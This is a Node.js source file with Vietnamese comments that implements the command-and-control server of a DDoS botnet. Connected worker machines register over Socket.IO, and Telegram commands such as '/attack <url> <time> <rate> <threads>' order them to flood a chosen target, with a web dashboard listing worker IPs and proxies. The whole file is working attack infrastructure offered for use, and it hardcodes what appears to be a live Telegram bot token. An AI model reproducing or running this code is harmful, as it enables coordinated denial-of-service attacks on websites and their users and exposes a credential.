process.on('uncaughtException', (err) => {
    console.error('[!] Uncaught Exception:', err.message);
});
process.on('unhandledRejection', (err) => {
    console.error('[!] Unhandled Rejection:', err.message);
});

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

// ==================== CONFIG ====================
const PORT = process.env.PORT || 10000;
const BOT_TOKEN = '8317101752:AAEphN_qXBLlMnD5Rg2oyZ1F3TnUYAeFw9E'; // Token bot Telegram của bạn
const ADMIN_ID = '8344034544'; // ID Telegram của bạn

// ==================== KIỂM TRA CONFIG ====================
if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
    console.error('[!] LỖI: Bạn chưa cấu hình BOT_TOKEN!');
    process.exit(1);
}

if (ADMIN_ID === 'YOUR_ADMIN_ID_HERE') {
    console.error('[!] LỖI: Bạn chưa cấu hình ADMIN_ID!');
    process.exit(1);
}

// ==================== EXPRESS SERVER ====================
const app = express();
const server = http.createServer(app);

// Cấu hình Socket.IO
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    transports: ['websocket', 'polling'],
    pingTimeout: 60000,
    pingInterval: 25000
});

// ==================== BIẾN TOÀN CỤC ====================
let workers = new Map(); // { socket.id: { socket, ip, status, target, lastSeen, info } }
let currentAttack = null;
let totalRequests = 0;
let attackStartTime = null;

// ==================== TELEGRAM BOT - FIX CONFLICT ====================
let bot;
try {
    // Tắt polling cũ nếu có
    bot = new TelegramBot(BOT_TOKEN, { 
        polling: {
            interval: 300,
            autoStart: true,
            params: {
                timeout: 10
            }
        }
    });
    
    console.log('[+] Telegram bot initialized');
} catch (error) {
    console.error('[!] Telegram bot init error:', error.message);
    process.exit(1);
}

// Xử lý lỗi polling
bot.on('polling_error', (error) => {
    console.error('[!] Polling error:', error.message);
});

// Command /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id.toString();
    console.log(`[Telegram] /start from ${chatId}`);
    
    if (chatId !== ADMIN_ID) {
        return bot.sendMessage(chatId, '❌ Bạn không có quyền sử dụng bot này!');
    }
    
    bot.sendMessage(chatId, `
🔥 **BOTNET MASTER READY**

📡 **Workers:** ${workers.size}
🎯 **Status:** ${currentAttack ? 'ATTACKING' : 'IDLE'}

📚 **COMMANDS:**
/workers - Xem danh sách worker
/attack <url> <time> <rate> <threads> - Bắt đầu tấn công
/stop - Dừng tấn công
/status - Xem trạng thái
/help - Hướng dẫn
    `, { parse_mode: 'Markdown' });
});

// Command /help
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id.toString();
    if (chatId !== ADMIN_ID) return;
    
    bot.sendMessage(chatId, `
📚 **HƯỚNG DẪN SỬ DỤNG**

/workers - Xem danh sách worker đang kết nối

/attack <url> <time> <rate> <threads> - Bắt đầu tấn công
  Ví dụ: \`/attack https://example.com 300 500 50\`
  - url: target cần tấn công
  - time: thời gian (giây)
  - rate: số request mỗi worker
  - threads: số luồng mỗi worker

/stop - Dừng tất cả tấn công

/status - Xem trạng thái hiện tại

/help - Hiện hướng dẫn này
    `, { parse_mode: 'Markdown' });
});

// Command /workers - FIX: Hiển thị worker dù idle hay attacking
bot.onText(/\/workers/, (msg) => {
    const chatId = msg.chat.id.toString();
    if (chatId !== ADMIN_ID) return;
    
    console.log(`[Telegram] /workers - Current workers: ${workers.size}`);
    
    if (workers.size === 0) {
        return bot.sendMessage(chatId, '❌ Không có worker nào đang kết nối!');
    }
    
    let message = `📡 **WORKERS (${workers.size}):**\n\n`;
    let count = 1;
    
    workers.forEach((worker, id) => {
        const statusEmoji = worker.status === 'attacking' ? '🔥' : '💤';
        const targetInfo = worker.target ? `🎯 \`${worker.target}\`` : '';
        const proxyInfo = worker.info?.proxies ? `📦 ${worker.info.proxies} proxies` : '';
        const lastSeen = Math.floor((Date.now() - worker.lastSeen) / 1000);
        
        message += `${count++}. ${statusEmoji} \`${worker.ip}\`\n`;
        message += `   Status: ${worker.status}\n`;
        if (targetInfo) message += `   ${targetInfo}\n`;
        if (proxyInfo) message += `   ${proxyInfo}\n`;
        message += `   Last seen: ${lastSeen}s ago\n\n`;
    });
    
    bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
});

// Command /attack
bot.onText(/\/attack (.+)/, async (msg, match) => {
    const chatId = msg.chat.id.toString();
    if (chatId !== ADMIN_ID) return;
    
    const args = match[1].split(' ');
    if (args.length < 4) {
        return bot.sendMessage(chatId, '❌ Thiếu tham số! Dùng: /attack <url> <time> <rate> <threads>');
    }
    
    const target = args[0];
    const time = parseInt(args[1]);
    const rate = parseInt(args[2]);
    const threads = parseInt(args[3]);
    
    // Kiểm tra tham số
    if (!target.startsWith('http')) {
        return bot.sendMessage(chatId, '❌ URL phải bắt đầu bằng http:// hoặc https://');
    }
    
    if (isNaN(time) || time < 10) {
        return bot.sendMessage(chatId, '❌ Thời gian phải >= 10 giây');
    }
    
    if (isNaN(rate) || rate < 10) {
        return bot.sendMessage(chatId, '❌ Rate phải >= 10');
    }
    
    if (isNaN(threads) || threads < 1) {
        return bot.sendMessage(chatId, '❌ Threads phải >= 1');
    }
    
    // FIX: Kiểm tra worker và log
    console.log(`[Attack] Workers available: ${workers.size}`);
    console.log(`[Attack] Workers list:`, Array.from(workers.values()).map(w => w.ip));
    
    if (workers.size === 0) {
        return bot.sendMessage(chatId, '❌ Không có worker nào để tấn công!');
    }
    
    // Dừng attack cũ nếu có
    if (currentAttack) {
        console.log('[Attack] Stopping previous attack');
        io.emit('stop');
        currentAttack = null;
    }
    
    // Bắt đầu attack mới
    currentAttack = { target, time, rate, threads, start: Date.now() };
    totalRequests = 0;
    attackStartTime = Date.now();
    
    // Gửi lệnh cho tất cả worker
    let sentCount = 0;
    workers.forEach((worker, id) => {
        console.log(`[Attack] Sending to worker ${worker.ip}, status: ${worker.status}, connected: ${worker.socket?.connected}`);
        
        if (worker.status === 'idle' && worker.socket && worker.socket.connected) {
            worker.socket.emit('attack', currentAttack);
            worker.status = 'attacking';
            worker.target = target;
            sentCount++;
            console.log(`[Attack] Sent to ${worker.ip}`);
        } else {
            console.log(`[Attack] Cannot send to ${worker.ip} - status: ${worker.status}, connected: ${worker.socket?.connected}`);
        }
    });
    
    bot.sendMessage(chatId, `
🔥 **BOTNET ATTACK STARTED**
🎯 Target: ${target}
⏱️ Time: ${time}s
⚡ Rate: ${rate}/worker
🧵 Threads: ${threads}/worker
📡 Workers: ${sentCount}/${workers.size}
    `, { parse_mode: 'Markdown' });
    
    // Tự động kết thúc sau thời gian
    setTimeout(() => {
        if (currentAttack) {
            console.log('[Attack] Time finished, stopping...');
            io.emit('stop');
            
            workers.forEach(worker => {
                if (worker.status === 'attacking') {
                    worker.status = 'idle';
                    worker.target = null;
                }
            });
            
            const elapsed = Math.floor((Date.now() - attackStartTime) / 1000);
            bot.sendMessage(chatId, `
✅ **ATTACK FINISHED**
⏱️ Time: ${elapsed}s
📊 Total Requests: ${totalRequests.toLocaleString()}
⚡ Average RPS: ${Math.floor(totalRequests / elapsed)}
📡 Workers: ${workers.size}
            `, { parse_mode: 'Markdown' });
            
            currentAttack = null;
        }
    }, time * 1000);
});

// Command /stop
bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id.toString();
    if (chatId !== ADMIN_ID) return;
    
    if (currentAttack) {
        console.log('[Stop] Stopping attack');
        io.emit('stop');
        
        workers.forEach(worker => {
            if (worker.status === 'attacking') {
                worker.status = 'idle';
                worker.target = null;
            }
        });
        
        const elapsed = Math.floor((Date.now() - attackStartTime) / 1000);
        bot.sendMessage(chatId, `
🛑 **ATTACK STOPPED**
⏱️ Time: ${elapsed}s
📊 Total Requests: ${totalRequests.toLocaleString()}
⚡ Average RPS: ${Math.floor(totalRequests / elapsed)}
        `, { parse_mode: 'Markdown' });
        
        currentAttack = null;
    } else {
        bot.sendMessage(chatId, '⚠️ Không có attack nào đang chạy');
    }
});

// Command /status
bot.onText(/\/status/, (msg) => {
    const chatId = msg.chat.id.toString();
    if (chatId !== ADMIN_ID) return;
    
    if (currentAttack) {
        const elapsed = Math.floor((Date.now() - attackStartTime) / 1000);
        const attacking = Array.from(workers.values()).filter(w => w.status === 'attacking').length;
        
        bot.sendMessage(chatId, `
📊 **ATTACK STATUS**
🎯 Target: ${currentAttack.target}
⏱️ Time: ${elapsed}s / ${currentAttack.time}s
📊 Requests: ${totalRequests.toLocaleString()}
⚡ RPS: ${Math.floor(totalRequests / elapsed)}
📡 Workers: ${attacking}/${workers.size}
        `, { parse_mode: 'Markdown' });
    } else {
        bot.sendMessage(chatId, `
📡 **SYSTEM STATUS**
Workers: ${workers.size}
Status: IDLE
        `, { parse_mode: 'Markdown' });
    }
});

// ==================== WEB DASHBOARD ====================
app.get('/', (req, res) => {
    const attacking = Array.from(workers.values()).filter(w => w.status === 'attacking').length;
    
    res.send(`
        <html>
        <head>
            <title>🔥 BOTNET MASTER</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: Arial; background: #0a0a0a; color: #fff; padding: 20px; }
                .container { max-width: 1200px; margin: 0 auto; }
                .card { background: #1a1a1a; border-radius: 10px; padding: 20px; margin: 10px 0; }
                .stat { color: #00ff00; font-size: 20px; }
                .label { color: #888; }
                .attacking { color: #ff4444; }
                table { width: 100%; border-collapse: collapse; }
                th, td { padding: 10px; text-align: left; border-bottom: 1px solid #333; }
                th { color: #00ff00; }
                .online { color: #00ff00; }
                .offline { color: #ff4444; }
            </style>
            <meta http-equiv="refresh" content="5">
        </head>
        <body>
            <div class="container">
                <h1>🔥 BOTNET MASTER</h1>
                
                <div class="card">
                    <h2>System Status</h2>
                    <p><span class="label">Workers:</span> <span class="stat">${workers.size}</span></p>
                    <p><span class="label">Status:</span> <span class="stat ${attacking > 0 ? 'attacking' : ''}">${attacking > 0 ? '🔥 ATTACKING' : '💤 IDLE'}</span></p>
                    <p><span class="label">Total Requests:</span> <span class="stat">${totalRequests.toLocaleString()}</span></p>
                    <p><span class="label">Port:</span> <span class="stat">${PORT}</span></p>
                </div>
                
                <div class="card">
                    <h2>Workers List (${workers.size})</h2>
                    <table>
                        <tr>
                            <th>#</th>
                            <th>IP</th>
                            <th>Status</th>
                            <th>Target</th>
                            <th>Proxies</th>
                            <th>Last Seen</th>
                            <th>Socket</th>
                        </tr>
                        ${Array.from(workers.entries()).map(([id, w], index) => `
                        <tr>
                            <td>${index + 1}</td>
                            <td>${w.ip}</td>
                            <td class="${w.status === 'attacking' ? 'attacking' : ''}">${w.status}</td>
                            <td>${w.target || '-'}</td>
                            <td>${w.info?.proxies || 0}</td>
                            <td>${Math.floor((Date.now() - w.lastSeen) / 1000)}s</td>
                            <td class="${w.socket?.connected ? 'online' : 'offline'}">${w.socket?.connected ? '✅' : '❌'}</td>
                        </tr>
                        `).join('')}
                        ${workers.size === 0 ? '<tr><td colspan="7" style="text-align:center">No workers connected</td></tr>' : ''}
                    </table>
                </div>
                
                <div class="card">
                    <h2>Telegram Commands</h2>
                    <table>
                        <tr><td><code>/workers</code></td><td>- Xem worker</td></tr>
                        <tr><td><code>/attack url time rate threads</code></td><td>- Tấn công</td></tr>
                        <tr><td><code>/stop</code></td><td>- Dừng</td></tr>
                        <tr><td><code>/status</code></td><td>- Trạng thái</td></tr>
                    </table>
                </div>
            </div>
        </body>
        </html>
    `);
});

app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        workers: workers.size,
        attacking: Array.from(workers.values()).filter(w => w.status === 'attacking').length,
        workersList: Array.from(workers.values()).map(w => ({
            ip: w.ip,
            status: w.status,
            target: w.target,
            connected: w.socket?.connected || false,
            lastSeen: w.lastSeen
        })),
        uptime: process.uptime()
    });
});

// ==================== SOCKET.IO - NHẬN KẾT NỐI WORKER ====================
io.on('connection', (socket) => {
    const clientIp = socket.handshake.address;
    console.log(`[+] Worker connected: ${socket.id} from ${clientIp}`);

    // Đăng ký worker
    socket.on('register', (data) => {
        const workerIp = data.ip || clientIp;
        
        workers.set(socket.id, {
            socket: socket,
            ip: workerIp,
            status: 'idle',
            target: null,
            lastSeen: Date.now(),
            info: {
                proxies: data.proxies || 0,
                totalProxies: data.totalProxies || 0
            }
        });
        
        console.log(`[+] Worker registered: ${workerIp} (Total: ${workers.size})`);
        
        // Gửi thông báo Telegram
        try {
            bot.sendMessage(ADMIN_ID, `✅ **Worker Connected**\nIP: \`${workerIp}\`\nTotal: ${workers.size}`, { parse_mode: 'Markdown' });
        } catch (e) {}

        // Nếu đang có attack, gửi lệnh cho worker mới
        if (currentAttack) {
            console.log(`[+] Sending ongoing attack to new worker: ${workerIp}`);
            socket.emit('attack', currentAttack);
            workers.get(socket.id).status = 'attacking';
            workers.get(socket.id).target = currentAttack.target;
        }

        socket.emit('registered', { status: 'ok', workers: workers.size });
    });

    // Xử lý ping
    socket.on('ping', () => {
        socket.emit('pong');
        const worker = workers.get(socket.id);
        if (worker) worker.lastSeen = Date.now();
    });

    // Nhận stats từ worker
    socket.on('stats', (data) => {
        const worker = workers.get(socket.id);
        if (worker) {
            worker.lastSeen = Date.now();
            if (data && data.count) {
                totalRequests += data.count;
            }
        }
    });

    // Ngắt kết nối
    socket.on('disconnect', (reason) => {
        const worker = workers.get(socket.id);
        if (worker) {
            console.log(`[-] Worker disconnected: ${worker.ip} - Reason: ${reason}`);
            
            // Gửi thông báo Telegram
            try {
                bot.sendMessage(ADMIN_ID, `❌ **Worker Disconnected**\nIP: \`${worker.ip}\`\nReason: ${reason}\nLeft: ${workers.size - 1}`, { parse_mode: 'Markdown' });
            } catch (e) {}
            
            workers.delete(socket.id);
        }
    });
});

// ==================== PING WORKER ĐỊNH KỲ ====================
setInterval(() => {
    workers.forEach((worker, id) => {
        if (worker.socket && worker.socket.connected) {
            worker.socket.emit('ping');
        }
    });
}, 15000);

// Kiểm tra worker chết
setInterval(() => {
    const now = Date.now();
    workers.forEach((worker, id) => {
        if (now - worker.lastSeen > 60000) {
            console.log(`[-] Worker ${worker.ip} timeout, removing...`);
            if (worker.socket) {
                worker.socket.disconnect(true);
            }
            workers.delete(id);
        }
    });
}, 30000);

// ==================== START SERVER ====================
server.listen(PORT, '0.0.0.0', () => {
    console.log(`[+] Master server running on port ${PORT}`);
    console.log(`[+] Web dashboard: http://localhost:${PORT}`);
    console.log(`[+] Telegram bot started!`);
    console.log(`[+] ADMIN_ID: ${ADMIN_ID}`);
});
